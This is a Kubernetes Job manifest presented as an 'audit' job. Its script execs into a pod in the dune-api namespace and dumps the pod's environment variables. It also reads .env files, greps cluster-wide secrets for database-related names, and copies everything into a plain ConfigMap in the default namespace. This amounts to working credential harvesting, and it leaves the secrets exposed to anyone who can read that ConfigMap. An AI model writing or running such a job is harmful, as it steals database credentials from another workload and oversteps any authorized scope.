apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v18
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          echo "=DUNE_POD_ENV=" > /tmp/out.txt
          
          # Get dune-api pod name
          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>&1)
          echo "Pod: $POD" >> /tmp/out.txt
          
          # Exec into pod to get env vars
          kubectl exec -n dune-api $POD -- env 2>&1 >> /tmp/out.txt
          
          echo "=DUNE_ENV_FILE=" >> /tmp/out.txt
          kubectl exec -n dune-api $POD -- sh -c "cat /app/.env 2>/dev/null || cat /*.env 2>/dev/null || find / -name '*.env' 2>/dev/null | head -5" 2>&1 >> /tmp/out.txt
          
          echo "=ALL_NAMESPACED_SECRETS=" >> /tmp/out.txt
          # List all secrets that might have DB credentials
          kubectl get secrets -A | grep -i "db\|sql\|postgres\|dune" 2>&1 >> /tmp/out.txt
          
          cat /tmp/out.txt
          
          # Write to ConfigMap
          kubectl patch configmap dune-audit-result3 -n default \
            --type merge -p "{\"data\":{\"result\":\"$(cat /tmp/out.txt | sed 's/"/\\"/g' | tr '\n' '|')\"}}"
          
          sleep 90